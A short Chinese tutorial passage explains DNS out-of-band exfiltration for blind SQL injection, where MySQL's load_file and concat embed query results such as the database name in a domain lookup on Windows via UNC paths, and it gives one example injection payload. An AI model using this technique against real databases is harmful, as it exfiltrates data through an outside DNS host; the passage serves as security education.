#### 原理

遇到sql注入无法取得回显时，盲注非常耗时，因此使用DNS外带来获取回显。

由于windows使用UNC路径，当遇到域名时会发起域名解析请求，使用sql语句中的load_file函数可以发起DNS请求，

当我们使用这样的语句注入时：`select load_file(concat(database(),database(),'www.baidu.com'))`

数据库先将查询的语句通过concat函数拼接，然后再用load_file函数解析，从而发起DNS请求，请求解析的域名中包含了我们需要的信息，而被解析的域名又包含在DNS日志中
